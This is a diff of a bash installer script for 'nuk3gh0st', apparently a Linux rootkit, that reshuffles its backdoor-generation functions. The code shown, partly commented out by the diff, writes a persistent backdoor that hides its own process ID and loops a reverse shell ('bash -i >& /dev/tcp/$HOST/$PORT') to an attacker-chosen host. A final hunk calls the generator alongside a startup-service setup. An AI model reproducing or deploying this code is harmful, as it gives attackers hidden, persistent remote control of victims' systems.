@@ -52,22 +52,22 @@ function show_help {
     	        
 }
 
-function generate_backdoor {
-	backdoor_path='/usr/share/nuk3gh0st/backdoor'
-	echo "#!/bin/bash" > $backdoor_path
-	echo "" >> $backdoor_path
-	echo "sleep 40" >> $backdoor_path
-	echo "/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
-	echo "" >> $backdoor_path
-	echo "while true" >> $backdoor_path
-	echo "do" >> $backdoor_path
-	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_path
-	echo "	sleep $SLEEP" >> $backdoor_path
-	echo "done" >> $backdoor_path
-	chmod +x $backdoor_path
-}
+#function generate_backdoor {
+#	backdoor_path='/usr/share/nuk3gh0st/backdoor'
+#	echo "#!/bin/bash" > $backdoor_path
+#	echo "" >> $backdoor_path
+#	echo "sleep 40" >> $backdoor_path
+#	echo "/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
+#	echo "" >> $backdoor_path
+#	echo "while true" >> $backdoor_path
+#	echo "do" >> $backdoor_path
+#	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_path
+#	echo "	sleep $SLEEP" >> $backdoor_path
+#	echo "done" >> $backdoor_path
+#	chmod +x $backdoor_path
+#}
 
-function generate_init_backdoor {
+function generate_backdoor {
 	backdoor_path='/usr/share/nuk3gh0st/backdoor'
 	echo "#!/bin/bash" > $backdoor_path
 	echo "" >> $backdoor_path
@@ -372,7 +372,7 @@ done
 
 if [[ $HOST_ARG && $PORT_ARG && $SLEEP_ARG && -z $HELP_ARG && -z $REMOVE_ARG ]]
 then
-	generate_init_backdoor
+	generate_backdoor
 	check_selinux_enable_startup_service
 elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && -z $HELP_ARG && $REMOVE_ARG ]]
 then
